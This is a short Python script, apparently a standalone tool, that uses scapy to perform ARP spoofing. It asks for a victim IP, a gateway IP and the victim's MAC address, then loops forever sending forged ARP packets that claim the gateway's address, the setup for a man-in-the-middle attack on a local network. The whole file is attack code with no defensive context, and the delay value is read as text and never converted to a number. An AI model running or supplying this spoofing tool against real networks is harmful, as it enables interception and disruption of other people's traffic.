#!/usr/bin/env python3

from scapy.all import *
from subprocess import call
import time

while 1:
    op = 1  # Op code 1 for ARP requests
    victim = input('Enter the target IP >>> ')  # Define Victim IP and remove spaces.
    victim = victim.replace(" ", "")

    spoof = input('Enter Gateway IP >>> ')  # Define Gateway IP and remove spaces.
    spoof = spoof.replace(" ", "")

    mac = input('Enter the target MAC >>> ')  # Define Victim MAC and remove spaces.
    mac = mac.replace("-", ":")
    mac = mac.replace(" ", "")

    sleeptime = input('Enter Buffer Time Between Packets (In Seconds) >>> ')

    arp = ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)

    while 1:
        send(arp)
        time.sleep(sleeptime)
